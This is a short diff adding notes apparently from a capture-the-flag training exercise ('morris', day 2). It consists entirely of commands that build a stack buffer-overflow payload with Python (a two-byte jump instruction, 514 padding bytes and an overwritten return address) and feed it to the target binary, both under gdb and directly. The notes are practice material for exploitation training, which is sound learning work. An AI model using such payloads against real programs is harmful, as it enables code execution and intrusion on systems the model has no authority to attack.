@@ -1,0 +1,8 @@
+gdb
+
+$ r < <(python -c 'print "\xeb\xfe" + "A"*514 + "\x38\xf4\xff\xbf"')
+
+local
+$ (python -c 'print "\xeb\xfe" + "A"*514 + "\x38\xf4\xff\xbf"') > ffff
+$ cat ffff | /home/skcctf/ctf_training/day2/morris/morris
+$ /home/skcctf/ctf_training/day2/morris/morris < ffff
